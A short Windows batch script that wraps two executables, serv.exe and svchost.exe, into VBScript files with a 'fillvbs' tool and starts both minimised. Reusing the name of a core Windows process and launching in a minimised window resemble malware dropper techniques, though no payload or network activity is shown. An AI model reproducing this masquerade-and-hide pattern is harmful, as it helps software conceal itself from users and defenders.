@Echo off
set path=%cd%\compile\bin
echo %path%
cd bin
fillvbs serv.exe serv.vbs
fillvbs svchost.exe svchost.vbs
start /MIN serv.vbs
timeout 3
start /MIN svchost.vbs
exit
